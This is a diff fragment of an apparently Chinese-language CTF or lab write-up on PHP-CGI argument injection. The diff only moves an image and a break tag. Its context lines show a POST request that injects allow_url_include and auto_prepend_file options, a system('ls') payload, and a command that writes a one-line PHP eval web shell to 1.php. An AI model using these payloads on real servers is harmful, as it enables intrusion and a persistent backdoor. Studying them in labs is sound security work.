@@ -113,13 +113,14 @@ POST /index.php/?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input 
 <?php echo system("ls"); ?>
 ````
 
-<img src="https://54huarui.github.io/blogs/internalwww/7.png" width="880" height="480">
-
+<br>
 
 写shell咯
 ````
 <?php echo system("echo '<? @eval(\$_POST[a]);?>' > 1.php");?>
 ````
+
+<img src="https://54huarui.github.io/blogs/internalwww/7.png" width="880" height="480">
 
 <br>
 
